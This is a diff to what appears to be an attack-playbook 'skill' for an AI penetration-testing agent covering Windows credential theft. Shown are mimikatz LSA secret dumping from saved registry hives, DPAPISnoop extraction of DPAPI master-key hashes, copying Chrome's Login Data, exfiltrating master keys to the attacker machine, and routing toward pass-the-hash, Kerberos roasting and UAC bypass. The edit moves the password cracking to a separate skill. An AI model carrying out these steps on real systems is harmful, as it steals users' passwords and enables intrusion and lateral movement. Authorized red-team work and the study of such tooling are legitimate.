@@ -356,17 +356,20 @@ reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
 mimikatz# lsadump::secrets /system:system.hiv /security:security.hiv
 ```
 
-### Offline DPAPI Cracking (Hashcat)
+### Offline DPAPI Master Key Extraction
 
-If you have master key files but not the password:
+If you have master key files but not the password, extract the hash for offline
+cracking:
 
 ```bash
 # Extract hashcat-format hashes from master keys
-DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\{SID} --mode hashcat --outfile bob.hc
-
-# Crack with hashcat (mode 15900 for DPAPI masterkey)
-hashcat -m 15900 bob.hc wordlist.txt -O -w4
+DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\{SID} --mode hashcat --outfile engagement/evidence/dpapi-masterkey-bob.hc
 ```
+
+**Do NOT crack hashes in this skill.** Save the DPAPI master key hash to
+`engagement/evidence/` and return to the orchestrator with the hash file path,
+hash type (DPAPI masterkey / hashcat mode 15900), and a routing recommendation
+to **credential-cracking**.
 
 ## Step 4: Browser Credentials
 
@@ -495,7 +498,7 @@ After harvesting credentials:
 - **Domain credentials found**: Route to **ad-discovery** for domain enumeration, or
   **pass-the-hash** / **kerberos-roasting** for lateral movement
 - **NTLM hashes extracted (SAM)**: Route to **pass-the-hash** for lateral movement,
-  or crack with hashcat
+  or route to **credential-cracking** for offline cracking
 - **Browser/vault creds for web apps**: Test against other systems (password reuse)
 - **Cloud credentials found**: Test for cloud access (AWS CLI, Azure CLI, gcloud)
 - **Need higher access for DPAPI**: Route to **windows-uac-bypass** (for high integrity)
@@ -562,8 +565,8 @@ copy "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" C:\Windows\Temp
 
 ### DPAPI blobs found but no way to decrypt
 Exfiltrate the master key files and credential blobs to the attacker machine.
-Use `DPAPISnoop` to generate Hashcat-format hashes and crack the user's password
-offline.
+Use `DPAPISnoop` to generate hashcat-format hashes (mode 15900), save to
+`engagement/evidence/`, and route to **credential-cracking**.
 
 ### "Access Denied" on other users' profiles
 Without admin access, you can only harvest credentials from the current user's profile.
